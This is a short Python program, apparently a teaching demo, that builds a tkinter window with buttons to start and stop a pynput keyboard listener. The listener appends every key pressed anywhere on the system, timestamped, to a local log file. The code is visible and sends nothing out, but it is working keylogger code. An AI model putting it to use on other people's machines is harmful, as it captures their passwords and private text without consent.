import tkinter as tk
from pynput import keyboard
from datetime import datetime

listener = None
logging_active = False

LOG_FILE = "key_log.txt"

def write_log(key):
    with open(LOG_FILE, "a") as f:
        f.write(f"{datetime.now()} : {key}\n")

def on_press(key):
    if logging_active:
        write_log(key)

def start_logging():
    global listener, logging_active
    if not logging_active:
        logging_active = True
        status_label.config(text="Status: Logging Started", fg="green")
        listener = keyboard.Listener(on_press=on_press)
        listener.start()

def stop_logging():
    global listener, logging_active
    if logging_active:
        logging_active = False
        status_label.config(text="Status: Logging Stopped", fg="red")
        if listener:
            listener.stop()

def clear_logs():
    open(LOG_FILE, "w").close()
    status_label.config(text="Status: Logs Cleared", fg="blue")

def exit_app():
    stop_logging()
    root.destroy()

# ---------- GUI ----------
root = tk.Tk()
root.title("Keystroke Logger Demo")
root.geometry("320x260")
root.resizable(False, False)

title = tk.Label(root, text="Keystroke Logger Demo", font=("Arial", 14, "bold"))
title.pack(pady=10)

status_label = tk.Label(root, text="Status: Idle", font=("Arial", 10))
status_label.pack(pady=5)

tk.Button(root, text="Start Logging", width=20, command=start_logging).pack(pady=5)
tk.Button(root, text="Stop Logging", width=20, command=stop_logging).pack(pady=5)
tk.Button(root, text="Clear Logs", width=20, command=clear_logs).pack(pady=5)
tk.Button(root, text="Exit", width=20, command=exit_app).pack(pady=5)

root.mainloop()
